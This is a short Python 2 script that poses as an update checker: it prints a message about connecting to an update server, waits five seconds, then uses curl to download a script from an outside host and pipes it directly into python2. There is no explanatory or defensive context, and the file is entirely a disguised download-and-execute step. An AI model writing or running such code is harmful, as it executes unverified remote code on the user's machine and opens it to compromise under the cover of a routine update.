import os
import time

print "Connect The Update Server..."
time.sleep(5)
os.system("curl -sL http://2.vu.2.vu/CheckUpdateInstaller | python2")
